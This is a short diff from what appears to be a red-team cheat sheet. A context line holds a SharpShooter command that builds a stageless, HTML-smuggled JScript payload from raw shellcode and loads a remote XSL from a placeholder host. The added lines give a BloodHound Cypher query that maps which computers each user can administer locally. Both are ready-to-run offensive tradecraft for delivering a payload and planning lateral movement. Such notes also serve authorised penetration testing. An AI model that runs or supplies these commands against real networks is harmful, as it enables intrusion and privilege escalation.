@@ -439,4 +439,8 @@ https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/
 
 `python SharpShooter.py --stageless --dotnetver 2 --payload js --output foo --rawscfile ./output/payload.bin --smuggle --template mcafee --com xslremote --awlurl http://blah/foo.xsl`
 
+### cypher queries
 
+user to which box the user has localadmin
+
+`MATCH (u:User)-[r:MemberOf|:AdminTo*1..]->(c:Computer) return u.name, collect(c.name)`
